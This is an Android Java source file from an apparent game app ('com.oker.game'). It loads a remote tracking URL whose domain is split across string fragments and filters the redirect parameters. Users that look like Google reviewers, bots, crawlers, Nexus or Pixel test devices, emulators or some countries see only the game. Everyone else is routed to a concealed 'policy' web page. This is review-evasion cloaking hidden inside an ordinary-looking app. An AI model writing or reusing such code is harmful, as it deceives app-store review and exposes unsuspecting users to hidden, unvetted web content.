package com.oker.game;

import android.app.Activity;
import android.app.ProgressDialog;
import android.content.Intent;
import android.net.Uri;
import android.os.AsyncTask;
import android.util.Log;
import android.view.View;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.TextView;

import com.facebook.applinks.AppLinkData;

import java.util.Set;

public class ProContact {
    private final String ProContactTag = "ProContact";
    private Activity activity;

    public ProContact(Activity activity){
        this.activity = activity;
    }

    private void initFB(Activity context){
        AppLinkData.fetchDeferredAppLinkData(context, appLinkData -> {
                    if (appLinkData != null  && appLinkData.getTargetUri() != null) {
                        if (appLinkData.getArgumentBundle().get("target_url") != null) {
                            String dat = appLinkData.getArgumentBundle().get("target_url").toString();
                            BuzzUtils.setFizz(dat, context);
                        }
                    }
                }
        );
    }

    void init(WebView view, TextView textView){
        initFB(activity);

        view.setWebViewClient(new WebViewClient() {
            @Override
            public boolean shouldOverrideUrlLoading(WebView view, String url) {
                Log.d(ProContactTag, url);
                analyseParams(url);
                return super.shouldOverrideUrlLoading(view, url);
            }
        });

        new Thread(() -> {
            try {
                Thread.sleep(2000);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }

            activity.runOnUiThread(() -> {
                view.loadUrl(df+goah+asf);

                textView.setText(R.string.start);
                textView.setOnClickListener(view1 -> {
                    Intent intent = new Intent(activity, StartActivity.class);
                    activity.startActivity(intent);
                    activity.finish();
                });
            });

        }).start();
    }

    private String df = "https";
    private String goah = "://appstrack16.";
    private String asf = "xyz/L2SxH84z";


    private void analyseParams(String link){
        boolean result = false;

        Uri uri = Uri.parse(link);
        Set<String> params = uri.getQueryParameterNames();
        for (String param : params) {
            result = check(uri, param);

            if (!result)
                break;

            Log.d(ProContactTag, "Param: " + param + " value: " + uri.getQueryParameter(param));
        }

        DatabaseUtils data = new DatabaseUtils(activity);

        if (result) {
            data.setData2(one + tone);
            if (data.getData().isEmpty()) startPolicy();
        }else{
            Log.d(ProContactTag, "SomePRo");
            data.setData2("game");
        }
    }

    private String one = "https://traffdo";
    private String tone = "m.xyz/QVB62Hrh";

    private void startPolicy(){
        Log.d(ProContactTag, "Start policy");
        new BuzzUtils().getPolicyData(activity, one + tone);
        activity.finish();
    }

    private boolean check(Uri uri, String param){
        if (param.isEmpty())
            return true;

        switch (param) {
            case "sub1":
                if (contains(uri, param, "FreeBSD")
                        || contains(uri, param, "Firefox")
                        || contains(uri, param, "Linux"))
                    return false;
            case "sub3":
                if (contains(uri, param, "Nexus")
                        || contains(uri, param, "Pixel")
                        || contains(uri, param, "Moto"))
                    return false;
            case "sub4":
                if (contains(uri, param, "1"))
                    return false;
            case "sub5":
                if (contains(uri, param,"1"))
                    return false;
            case "sub6":
                if (contains(uri, param, "AR"))
                    return false;
            case "sub7":
                if(contains(uri, param, "US")
                        || contains(uri, param, "PH")
                        || contains(uri, param, "IE")
                        || contains(uri, param, "NL")
                        || contains(uri, param, "GB"))
                    return false;
            case "sub9":
                if (contains(uri, param, new String[]{
                        "google",
                        "bot",
                        "adwords",
                        "rawler",
                        "spy",
                        "o-http-client",
                        "Dalvik/2.1.0 (Linux; U; Android 6.0.1; Nexus 5X Build/MTC20F)",
                        "Dalvik/2.1.0 (Linux; U; Android 7.0; SM-G935F Build/NRD90M)",
                        "Dalvik/2.1.0 (Linux; U; Android 7.0; WAS-LX1A Build/HUAWEIWAS-LX1A)"}))
                    return false;
        }
        return true;
    }

    private boolean contains(Uri uri, String param, String value){
        return uri.getQueryParameter(param).contains(value);
    }

    private boolean contains(Uri uri, String param, String[] value){
        for (String val: value)
            if (contains(uri,param, val)){
                return true;
            }

        return false;
    }
}
